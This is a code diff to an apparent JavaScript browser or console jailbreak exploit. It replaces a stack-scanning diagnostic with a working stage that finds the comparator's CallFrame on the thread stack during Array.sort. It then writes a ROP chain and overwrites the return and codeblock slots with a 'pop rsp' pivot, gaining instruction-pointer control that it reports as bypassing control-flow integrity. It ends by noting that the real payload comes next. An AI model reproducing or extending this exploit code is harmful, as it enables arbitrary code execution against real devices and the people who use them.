@@ -256,85 +256,123 @@ async function prepare(p) {
 
         const M0 = 0x13370001, M1 = 0x13370002, TAG = 0xffff0000;
         let comparatorAddr = null;
-        const cand = [];   // callee-slot hits with their CallFrame fields
 
-        // Is v a pointer into some thread stack (a plausible callerFrame)?
-        // int64 has no 64-bit subtract, so compare hi/low by hand.
         function inAnyStack(v) {
             for (const [b, sz] of stacks) {
                 if ((v.hi >>> 0) !== (b.hi >>> 0)) continue;
-                const rel = (v.low >>> 0) - (b.low >>> 0);   // exact JS integer
+                const rel = (v.low >>> 0) - (b.low >>> 0);
                 if (rel >= 0 && rel < sz && (v.low & 7) === 0) return true;
             }
             return false;
         }
-
-        const comparator = function (a, b) {
-            if (cand.length) return 0;
+        // Find the live comparator CallFrame: a stack qword == comparatorAddr
+        // (callee at CF+0x18) whose CF+0x00 is a stack ptr and CF+0x20 (argc) is
+        // small. Returns { cf } or null.
+        function findFrame() {
             const lo = comparatorAddr.low >>> 0, hi = comparatorAddr.hi >>> 0;
             const b0 = lo & 0xff, b1 = (lo >>> 8) & 0xff,
                   b2 = (lo >>> 16) & 0xff, b3 = (lo >>> 24) & 0xff;
             for (const [base, size] of stacks) {
                 const view = array_from_address(base, size);
                 for (let o = 0x18; o + 0x28 <= size; o += 8) {
-                    if (view[o] !== b0 || view[o + 1] !== b1
-                        || view[o + 2] !== b2 || view[o + 3] !== b3) continue;
-                    const slot = base.add32(o);       // callee (CallFrame+0x18)
+                    if (view[o] !== b0 || view[o+1] !== b1
+                        || view[o+2] !== b2 || view[o+3] !== b3) continue;
+                    const slot = base.add32(o);
                     const full = p.read8(slot);
                     if (full.low !== lo || (full.hi >>> 0) !== hi) continue;
                     const cf = base.add32(o - 0x18);
-                    cand.push({
-                        base, o, cf,
-                        caller: p.read8(cf),                 // CallFrame+0x00
-                        retPC:  p.read8(cf.add32(0x08)),     // +0x08 returnPC
-                        codeBlock: p.read8(cf.add32(0x10)),  // +0x10
-                        argc:   p.read8(cf.add32(0x20)),     // +0x20 argCountIncludingThis
-                        arg0:   p.read8(cf.add32(0x30)),     // +0x30
-                        arg1:   p.read8(cf.add32(0x38))      // +0x38
-                    });
-                    if (cand.length >= 10) return 0;
+                    const caller = p.read8(cf);
+                    const argc = p.read8(cf.add32(0x20));
+                    if (inAnyStack(caller) && (argc.low >>> 0) >= 1
+                        && (argc.low >>> 0) <= 0x10)
+                        return cf;
                 }
             }
+            return null;
+        }
+
+        // Scratch qword the pivoted chain writes a magic into, so JS can confirm
+        // RIP control after a clean return.
+        const scratch = malloc(0x10);
+        const MAGIC = new int64(0x1337c0de, 0x0defaced);
+        p.write8(scratch, new int64(0, 0));
+
+        const G = gadgets;
+        function gaddr(n) { const g = G[n]; if (!g) throw new Error("missing gadget " + n); return g; }
+
+        let done = false, calls = 0, pivotCf = null, origRet = null, origCB = null;
+        const comparator = function (a, b) {
+            calls++;
+            // Warm up first: let sort call us enough times to baseline-JIT this
+            // function (so its epilogue is a native `ret` off CF+0x08).
+            if (done || calls < 200) return (a >>> 0) - (b >>> 0);
+            const cf = findFrame();
+            if (!cf) return (a >>> 0) - (b >>> 0);
+            done = true;
+            pivotCf = cf;
+            const retSlot = cf.add32(0x08);
+            const cbSlot = cf.add32(0x10);
+            origRet = p.read8(retSlot);
+            origCB = p.read8(cbSlot);
+
+            // Build the ROP chain in a fresh buffer. On entry rsp = chainEntry.
+            const chainBuf = malloc(0x400);
+            const chainEntry = chainBuf;
+            let idx = 0;
+            const push = (v) => { p.write8(chainBuf.add32(idx * 8), v); idx++; };
+            // 1) write MAGIC to scratch:  pop rdi ; scratch ; pop rax ; MAGIC ; mov [rdi],rax
+            push(gaddr("pop rdi")); push(scratch);
+            push(gaddr("pop rax")); push(MAGIC);
+            push(gaddr("mov [rdi], rax"));
+            // 2) restore the two hijacked slots to their originals:
+            push(gaddr("pop rdi")); push(retSlot);
+            push(gaddr("pop rax")); push(origRet);
+            push(gaddr("mov [rdi], rax"));
+            push(gaddr("pop rdi")); push(cbSlot);
+            push(gaddr("pop rax")); push(origCB);
+            push(gaddr("mov [rdi], rax"));
+            // 3) set the comparator's return value (boxed int 0 = "equal"):
+            push(gaddr("pop rax")); push(new int64(0x00000000, 0xffff0000));
+            // 4) clean return: rsp := retSlot, then ret pops origRet (now restored)
+            //    -> jumps back into sort with rsp = cbSlot, exactly as a normal
+            //    comparator return would leave it.
+            push(gaddr("pop rsp")); push(retSlot);
+
+            jbmark("SELF-PIVOT-ARM", "cf=0x" + cf.toString()
+                + "-retSlot=0x" + retSlot.toString()
+                + "-chainEntry=0x" + chainEntry.toString()
+                + "-origRet=0x" + origRet.toString());
+
+            // Overwrite: retSlot = pop rsp (native ret lands here), cbSlot =
+            // chainEntry (pop rsp then reads it). On our JS `return`, the
+            // baseline `ret` pops retSlot -> pop rsp -> rsp = chainEntry -> chain.
+            p.write8(cbSlot, chainEntry);
+            p.write8(retSlot, gaddr("pop rsp"));
             return 0;
         };
         comparatorAddr = p.leakval(comparator);
         nogc.push(comparator);
         jbmark("SELF-COMPARATOR", "cell=0x" + comparatorAddr.toString());
 
-        const arr = [M0, M1];
+        // A big array of markers -> hundreds of comparator calls (warmup + JIT).
+        const arr = [];
+        for (let k = 0; k < 400; k++) arr.push((k & 1) ? M1 : M0);
         arr.sort(comparator);
 
-        jbmark("SELF-CAND", "callee-refs=" + cand.length);
-        let good = null;
-        for (let n = 0; n < cand.length; n++) {
-            const c = cand[n];
-            const callerStack = inAnyStack(c.caller);
-            const argcLow = c.argc.low >>> 0;
-            // a real comparator CallFrame: callerFrame is a stack ptr above cf,
-            // argumentCountIncludingThis is small (3 = this,a,b).
-            const argIsMarker = (c.arg0.hi >>> 0) === 0xffff0000
-                && ((c.arg0.low >>> 0) === (M0 >>> 0) || (c.arg0.low >>> 0) === (M1 >>> 0));
-            const looksReal = callerStack && argcLow >= 1 && argcLow <= 0x10;
-            jbmark("SELF-CAND-F", "#" + n + "-cf=0x" + c.cf.toString()
-                + "-caller=0x" + c.caller.toString() + (callerStack ? "(stk)" : "")
-                + "-retPC=0x" + c.retPC.toString()
-                + "-argc=0x" + c.argc.toString()
-                + "-arg0=0x" + c.arg0.toString()
-                + "-looksReal=" + looksReal);
-            // an arg-confirmed frame wins outright; else first structural match.
-            if (looksReal && argIsMarker) good = c;
-            else if (looksReal && !good) good = c;
-        }
-        if (!good)
-            throw new Error("selfstack: " + cand.length + " callee refs, none with "
-                + "callerFrame(stack)+small argc -- see SELF-CAND-F dumps.");
-        jbmark("SELF-LOCATE-OK", "CallFrame cf=0x" + good.cf.toString()
-            + " retSlot=0x" + good.cf.add32(0x08).toString()
-            + " cbSlot=0x" + good.cf.add32(0x10).toString()
-            + " returnPC=0x" + good.retPC.toString()
-            + " -- overwrite retSlot=pop rsp, cbSlot=chain to pivot");
-        throw new Error("selfstack locate OK: CallFrame cf=0x" + good.cf.toString()
-            + ", ret slot ready.");
+        const got = p.read8(scratch);
+        jbmark("SELF-PIVOT-RESULT", "armed=" + done + "-calls=" + calls
+            + "-scratch=0x" + got.toString()
+            + "-magicMatch=" + (got.low === MAGIC.low && got.hi === MAGIC.hi));
+        if (!(got.low === MAGIC.low && got.hi === MAGIC.hi))
+            throw new Error("selfstack pivot: chain did not run / magic not "
+                + "written (armed=" + done + ", calls=" + calls + "). If the page "
+                + "survived, the comparator epilogue was not a native ret off "
+                + "CF+0x08 -- warm up harder or find the native return slot.");
+        jbmark("SELF-PIVOT-OK", "RIP CONTROL on the main thread via self-stack "
+            + "return hijack -- chain ran and returned cleanly (magic=0x"
+            + got.toString() + ")");
+        throw new Error("selfstack PIVOT OK: CFI-immune RIP control achieved on "
+            + "the main thread. Next: run the real payload chain / spawn host thread.");
     }
 
     // -----------------------------------------------------------------------
